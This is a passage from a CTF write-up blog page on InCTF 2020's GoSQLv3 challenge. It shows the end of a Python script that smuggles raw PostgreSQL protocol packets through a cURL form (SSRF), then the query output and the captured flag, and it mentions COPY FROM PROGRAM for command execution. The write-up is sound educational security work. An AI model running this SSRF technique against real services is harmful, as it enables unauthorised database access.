+    test <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;51000000</span><span style="color:#e6db74">{</span>query_len_packet<span style="color:#e6db74">}{</span>query_hex_packet<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+    <span style="color:#75715e"># Termination</span>
+    test <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;5800000004&#34;</span>
+
+    to_send <span style="color:#f92672">=</span> encode(test)
+
+    req <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;url&#39;</span>: to_send})
+    print(req<span style="color:#f92672">.</span>text)
+</code></pre></div><ul>
+<li>The encode function was taken from Gopherus’ <a href="https://github.com/tarunkant/Gopherus/blob/master/scripts/MySQL.py" target="_blank">MySQL</a> exploit and it surrounds each two hex characters by a %.</li>
+<li>The query_len was the actual length of the query + 5, and the packet value had to be the hex value of query_len.</li>
+<li>The limitation to 122 chars is related to the query_len changing drastically.</li>
+</ul>
+<h2 id="finding-the-flag-by-an-unusual-way">Finding the flag by an unusual way</h2>
+<p>By <code>listing permissions</code>, I noticed an existing table called <code>cmd_exec</code> which I could select.</p>
+<pre tabindex="0"><code>SQL&gt; SELECT grantee,table_catalog,table_schema,table_name,privilege_type FROM information_schema.role_table_grants                                                        
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;SomeTimes hard chall is good&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;h2&gt;Welcome Back!!! admin !!!&lt;/h2&gt;
+&lt;h3&gt;You have one functionality that you can cURL&lt;/h3&gt;
+&lt;form method=POST&gt;
+put url : &lt;input type=&#34;text&#34; name=&#34;url&#34;&gt;
+&lt;button type=&#34;submit&#34;&gt;GO&lt;/button&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+
+S→application_namepsqlS↓client_encodingUTF8S↨DateStyleISO, MDYS↓integer_datetimesonSntervalStylepostgresS§is_superuseroffS↓server_encodingUTF8S→server_version9.5.21S%session_authorizationhoneysinghS#standard_conforming_stringsonS§TimeZoneEtc/UTCK♀♠=‼f�)Z♣IT�♣grantee/�☻♦‼������table_catalog/�♥♦‼������table_schema/�♦♦‼������table_name/�♣♦‼������privilege_type/�♠♦‼������D&lt;♣
+honeysinghgosqlv3♠public♣eeeee♠INSERTD&lt;♣
+honeysinghgosqlv3♠public♣eeeee♠SELECTD&lt;♣
+honeysinghgosqlv3♠public♣eeeee♠UPDATED&lt;♣
+honeysinghgosqlv3♠public♣eeeee♠DELETED&gt;♣
+honeysinghgosqlv3♠public♣eeeeTRUNCATED@♣
+honeysinghgosqlv3♠public♣eeeee
+REFERENCESD=♣
+honeysinghgosqlv3♠public♣eeeeeTRIGGERD?♣
+honeysinghgosqlv3♠publifooooooo♠INSERTD?♣
+honeysinghgosqlv3♠publifooooooo♠SELECTD?♣
+honeysinghgosqlv3♠publifooooooo♠UPDATED?♣
+honeysinghgosqlv3♠publifooooooo♠DELETEDA♣
+honeysinghgosqlv3♠publifooooooTRUNCATEDC♣
+honeysinghgosqlv3♠publifooooooo
+REFERENCESD@♣
+honeysinghgosqlv3♠publifoooooooTRIGGERD&lt;♣
+honeysinghgosqlv3♠public♣ddddd♠INSERTD&lt;♣
+honeysinghgosqlv3♠public♣ddddd♠SELECTD&lt;♣
+honeysinghgosqlv3♠public♣ddddd♠UPDATED&lt;♣
+honeysinghgosqlv3♠public♣ddddd♠DELETED&gt;♣
+honeysinghgosqlv3♠public♣ddddTRUNCATED@♣
+honeysinghgosqlv3♠public♣ddddd
+REFERENCESD=♣
+honeysinghgosqlv3♠public♣dddddTRIGGERD:♣♣inctfgosqlv3♠publicmd_exec♠INSERTD:♣♣inctfgosqlv3♠publicmd_exec♠SELECTD:♣♣inctfgosqlv3♠publicmd_exec♠UPDATED:♣♣inctfgosqlv3♠publicmd_exec♠DELETED&lt;♣♣inctfgosqlv3♠publicmd_exeTRUNCATED&gt;♣♣inctfgosqlv3♠publicmd_exec
+REFERENCESD;♣♣inctfgosqlv3♠publicmd_execTRIGGERD@♣
+honeysinghgosqlv3♠public        inctf2020♠SELECTC♫SELECT 29Z♣I
+</code></pre><p>Selecting it for the lulz brought us the flag!!</p>
+<pre tabindex="0"><code>SQL&gt; SELECT * FROM cmd_exec
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;SomeTimes hard chall is good&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;h2&gt;Welcome Back!!! admin !!!&lt;/h2&gt;
+&lt;h3&gt;You have one functionality that you can cURL&lt;/h3&gt;   
+&lt;form method=POST&gt;
+put url : &lt;input type=&#34;text&#34; name=&#34;url&#34;&gt;
+&lt;button type=&#34;submit&#34;&gt;GO&lt;/button&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+
+S→application_namepsqlS↓client_encodingUTF8S↨DateStyleISO, MDYS↓integer_datetimesonSntervalStylepostgresS§is_superuseroffS↓server_encodingUTF8S→server_version9.5.21S%session_authorizationhoneysinghS#standard_conforming_stringsonS§TimeZoneEtc/UTCK♀      [qi�↕Z♣IT#☺cmd_output☺�♥☺↓������DM☺CFLAG: inctf{Life_Without_Gopherus_not_having_postgreSQL_exploit_:(}D
+SELECT 2Z♣I
+</code></pre><p>Obviously, this is not the intended way to do it. As SpyD3r states in his official <a href="https://spyclub.tech/2020/08/02/inctf2020-gosqlv3-challenge-writeup/" target="_blank">writeup</a>, <code>&#34;The GoSQLv3 challenge got 8 solves but I would say the only one full solve that was RCE by the EpicLeetTeam(Congratulations for the first blood) but mistakenly the team has saved the flag on one of the table and most of the team just read the flag from that table.&#34;</code></p>
+<p>However, I <strong>felt</strong> it actually <strong>was</strong>, since the user was not superadmin and there was no way to COPY TO or FROM a program or file.</p>
+<p>Nevertheless, <code>SpyD3r</code> shows how to take the privileges from a table that had them, uploading a library and executing commands as the system user. However, as the table name was <code>cmd_exec</code> (and thats the name that appears in every PostgreSQL cheatsheet) perhaps using that <code>set role</code> trick was enough to <a href="https://www.postgresql.org/docs/9.5/sql-copy.html" target="_blank">COPY</a> FROM PROGRAM and read the flag.</p>
+<p>To finish with, I’d like to thank <a href="https://twitter.com/TarunkantG" target="_blank">Tarunkant</a> (aka SpyD3r) for the support and the great challenge, because I liked every piece of it and learnt a ton! and <a href="https://twitter.com/teambi0s" target="_blank">teambi0s</a> for the CTF.</p>
+<p>I hope you liked it, or at least learnt something!</p>
+<p><a href="https://twitter.com/jorge_ctf" target="_blank">Jorge</a></p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr/>
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://jorgectf.gitlab.io/blog/post/dragonsector-2020-scratchpad/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Solution for DragonSector 2020 CTF&#39;s ScratchPad challenge</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://jorgectf.gitlab.io/blog/post/portswigger-java-custom-gadget-chain/">
+                  <span class="button__text">Solving PortSwigger Lab: Developing a custom gadget chain for Java deserialization</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+<script src="https://unpkg.com/shiki"></script>
+
+<script>
+    if (document.querySelector("code[data-lang*='ql']")) {
+        shiki
+            .getHighlighter({
+                theme: 'github-dark',
+                langs: [
+                    {
+                        id: 'codeql',
+                        scopeName: 'source.ql',
+                        path: '/languages/codeql.tmLanguage.json',
+                        samplePath: 'codeql.sample',
+                        aliases: ['ql']
+                    }
+                ]
+            })
+            .then(highlighter => {
+                for (codeElement of document.querySelectorAll("code[data-lang]")) {
+                    try {
+                        let prev = codeElement.textContent
+                        let code = highlighter.codeToHtml(prev, { lang: codeElement.dataset.lang.toString() })
+                        codeElement.parentNode.innerHTML = code
+                    } catch(err) {
+                        console.log(err)
+                    }
+                }
+                for (shikiElement of document.querySelectorAll("pre[class='shiki']")) {
+                    shikiElement.parentNode.parentNode.replaceChild(
+                        shikiElement, shikiElement.parentNode
+                    )
+                }
+            })
+    }
+</script>
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="https://jorgectf.gitlab.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.gitlab.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+      <div class="copyright">
+        <span>© 2021 Powered by
+          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by
+          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://jorgectf.gitlab.io/blog/assets/main.js"></script>
+
+
+      
+    </div>
+
+    
+  
+
+</body></html>
